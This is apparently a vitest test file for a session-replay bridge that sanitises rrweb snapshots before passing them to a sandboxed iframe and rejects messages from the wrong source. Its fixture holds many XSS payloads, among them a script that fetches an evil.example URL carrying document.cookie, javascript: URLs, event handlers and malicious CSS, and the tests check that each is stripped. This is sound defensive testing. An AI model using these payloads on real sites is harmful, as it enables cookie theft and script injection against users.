/**
 * Replayer bridge (Phase B 10.2, 12.3): malicious rrweb payloads are neutralised before anything is posted to the
 * sandboxed frame, and only messages from the frame's own window that validate are accepted.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { BLOCKED_URL } from '@indiansassist/shared';
import { ReplayerBridge, sanitiseEvents } from '../src/assist/console/mirror/replayerBridge';

const el = (id: number, tagName: string, attributes: Record<string, unknown> = {}, childNodes: unknown[] = []) => ({ type: 2, id, tagName, attributes, childNodes });
const text = (id: number, textContent: string, extra: Record<string, unknown> = {}) => ({ type: 3, id, textContent, ...extra });

/** A full snapshot carrying every §12.3 attack the bridge must strip. */
function hostileSnapshot() {
  const body = el(4, 'body', { onload: 'steal()' }, [
    el(5, 'script', {}, [text(6, 'fetch("https://evil.example/?c="+document.cookie)')]),
    el(7, 'a', { href: 'javascript:alert(1)', onclick: 'alert(2)', ping: 'https://evil.example/ping' }, [text(8, 'click me')]),
    el(9, 'iframe', { src: 'https://evil.example/frame', srcdoc: '<script>alert(3)</script>', rr_width: '300px', rr_height: '150px' }),
    el(10, 'object', { data: 'https://evil.example/x.swf' }),
    el(11, 'embed', { src: 'https://evil.example/x.swf' }),
    el(12, 'img', { src: 'data:image/svg+xml;base64,PHN2Zz4=', srcset: 'javascript:alert(4) 1x, https://cdn.example/a.png 2x' }),
    el(13, 'div', { style: 'background:url(javascript:alert(5));width:expression(alert(6))' }),
    el(14, 'style', {}, [text(15, '@import url(https://evil.example/x.css); .a{background:url("vbscript:x")}', { isStyle: true })]),
    el(16, 'form', { action: 'data:text/html,<script>alert(7)</script>' }, [el(17, 'button', { formaction: 'javascript:alert(8)' })]),
    el(18, 'meta', { 'http-equiv': 'refresh', content: '0;url=https://evil.example' }),
    el(19, 'base', { href: 'https://evil.example/' }),
    el(20, 'img', { src: 'ms-its:mhtml:file://C:/x.mht!x' }),
    el(21, 'p', { title: 'plain text stays' }, [text(22, 'Hello')]),
  ]);
  const html = el(2, 'html', {}, [el(3, 'head', {}, []), body]);
  return { type: 2, timestamp: 1000, data: { node: { type: 0, id: 1, childNodes: [html] }, initialOffset: { top: 0, left: 0 } } };
}

function find(node: unknown, id: number): Record<string, unknown> | undefined {
  const n = node as { id?: number; childNodes?: unknown[] };
  if (n?.id === id) return n as Record<string, unknown>;
  for (const c of n?.childNodes ?? []) {
    const f = find(c, id);
    if (f) return f;
  }
  return undefined;
}

let frame: HTMLIFrameElement;
let bridge: ReplayerBridge;
let posted: unknown[];

function fromFrame(data: unknown, source: unknown = frame.contentWindow, origin = window.location.origin) {
  window.dispatchEvent(new MessageEvent('message', { data, source: source as Window, origin }));
}

beforeEach(() => {
  frame = document.createElement('iframe');
  document.body.appendChild(frame);
  posted = [];
  vi.spyOn(frame.contentWindow!, 'postMessage').mockImplementation(((m: unknown, target: unknown) => {
    expect(target).toBe(window.location.origin);
    posted.push(m);
  }) as never);
  bridge = new ReplayerBridge();
  bridge.attach(frame);
});

afterEach(() => {
  bridge.dispose();
  frame.remove();
});

describe('sanitiseEvents (malicious rrweb payloads)', () => {
  it('strips scripts, frames, handlers, dangerous URLs and CSS before replay', () => {
    const [snap] = sanitiseEvents([hostileSnapshot()]) as [{ data: { node: unknown } }];
    const root = snap.data.node;
    expect(find(root, 5)).toBeUndefined(); // <script> and its text are gone
    expect(find(root, 6)).toBeUndefined();
    expect(find(root, 19)).toBeUndefined(); // <base>
    expect(find(root, 18)).toBeUndefined(); // <meta http-equiv>
    expect(find(root, 4)!.attributes).toEqual({}); // onload dropped
    const a = find(root, 7)!.attributes as Record<string, unknown>;
    expect(a).toEqual({ href: BLOCKED_URL });
    expect(find(root, 9)).toEqual({ type: 2, id: 9, tagName: 'div', attributes: { 'data-ia-placeholder': 'iframe', rr_width: '300px', rr_height: '150px' }, childNodes: [] });
    expect(find(root, 10)!.tagName).toBe('div');
    expect(find(root, 11)!.tagName).toBe('div');
    const img = find(root, 12)!.attributes as Record<string, string>;
    expect(img.src).toBe(BLOCKED_URL);
    expect(img.srcset).toBe(`${BLOCKED_URL} 1x, https://cdn.example/a.png 2x`);
    const style = (find(root, 13)!.attributes as Record<string, string>).style;
    expect(style).not.toMatch(/javascript:|expression\(/i);
    const css = find(root, 15)!.textContent as string;
    expect(css).not.toMatch(/@import|vbscript:/i);
    expect((find(root, 16)!.attributes as Record<string, string>).action).toBe(BLOCKED_URL);
    expect(find(root, 17)!.attributes).toEqual({});
    expect((find(root, 20)!.attributes as Record<string, string>).src).toBe(BLOCKED_URL);
    expect(find(root, 21)!.attributes).toEqual({ title: 'plain text stays' });
    // What remains of the attacks is inert text (no handler, no script node, no executable URL or CSS function).
    expect(JSON.stringify(snap)).not.toMatch(/javascript:|vbscript:|expression\(|@import|steal\(|document\.cookie|<script/i);
  });

  it('drops custom, plugin and adopted-stylesheet events and strips the Meta query and fragment', () => {
    const out = sanitiseEvents([
      { type: 4, timestamp: 1, data: { href: 'https://app.example/inbox?token=abc#t=xyz', width: 1280, height: 800 } },
      { type: 5, timestamp: 2, data: { tag: 'x', payload: {} } },
      { type: 6, timestamp: 3, data: { plugin: 'p', payload: {} } },
      { type: 3, timestamp: 4, data: { source: 15, id: 1, styles: [] } },
      { type: 3, timestamp: 5, data: { source: 8, id: 3, adds: [{ rule: '@import url(https://evil.example/a.css); .x{color:red}' }] } },
      { type: 3, timestamp: 6, data: { source: 0, adds: [{ parentId: 4, nextId: null, node: el(30, 'script', {}, []) }], removes: [], texts: [], attributes: [{ id: 7, attributes: { onmouseover: 'x()', href: 'javascript:y()' } }] } },
      'not an event',
    ]) as { type: number; data: Record<string, unknown> }[];
    expect(out.map((e) => e.type)).toEqual([4, 3, 3]);
    expect(out[0]!.data.href).toBe('https://app.example/inbox');
    expect(JSON.stringify(out[1])).not.toContain('@import');
    expect(out[2]!.data.adds).toEqual([]);
    expect(out[2]!.data.attributes).toEqual([{ id: 7, attributes: { href: BLOCKED_URL } }]);
  });

  it('keeps a clean event deep-equal', () => {
    const clean = { type: 3, timestamp: 7, data: { source: 2, type: 2, id: 21, x: 10, y: 20 } };
    expect(sanitiseEvents([clean])).toEqual([clean]);
  });
});

describe('ReplayerBridge', () => {
  it('queues until rp.ready from the frame, then posts sanitised events only', () => {
    bridge.snapshot(12, [hostileSnapshot()]);
    expect(posted).toHaveLength(0);
    fromFrame({ t: 'rp.ready' });
    expect(posted).toHaveLength(1);
    const msg = posted[0] as { t: string; tabId: number; events: unknown[] };
    expect(msg).toMatchObject({ t: 'rp.snapshot', tabId: 12 });
    expect(JSON.stringify(msg.events)).not.toMatch(/javascript:|<script|onload|onclick|srcdoc|evil\.example/i);
    bridge.events(12, [{ type: 5, timestamp: 9, data: {} }]);
    expect(posted).toHaveLength(1); // nothing survived sanitation, nothing posted
  });

  it('a newer snapshot replaces queued messages for the same tab', () => {
    bridge.snapshot(1, [hostileSnapshot()]);
    bridge.events(1, [{ type: 3, timestamp: 2, data: { source: 2, type: 2, id: 1 } }]);
    bridge.snapshot(1, [hostileSnapshot()]);
    bridge.focus(1);
    fromFrame({ t: 'rp.ready' });
    expect(posted.map((m) => (m as { t: string }).t)).toEqual(['rp.snapshot', 'rp.focus']);
  });

  it('ignores messages from any other source and messages that fail validation', () => {
    const seen = vi.fn();
    bridge.on(seen);
    fromFrame({ t: 'rp.ready' }, window);
    fromFrame({ t: 'rp.ready' }, frame.contentWindow, 'https://evil.example');
    fromFrame({ t: 'rp.pointer', tabId: 1, kind: 'click', nodeId: 3, vx: 0.5, vy: 0.5, button: 0, modifiers: { alt: false, ctrl: false, meta: false, shift: false } }, null);
    expect(seen).not.toHaveBeenCalled();
    expect(bridge.isReady).toBe(false);
    fromFrame({ t: 'rp.pointer', tabId: 1, kind: 'click', nodeId: 3, vx: 7, vy: 0.5, button: 0, modifiers: {} });
    fromFrame({ t: 'rp.eval', code: 'alert(1)' });
    expect(seen).not.toHaveBeenCalled();
    expect(bridge.rejected).toBeGreaterThanOrEqual(3);
    fromFrame({ t: 'rp.maskStats', tabId: 1, masked: 4, revealed: 0 });
    expect(seen).toHaveBeenCalledWith({ t: 'rp.maskStats', tabId: 1, masked: 4, revealed: 0 });
  });
});
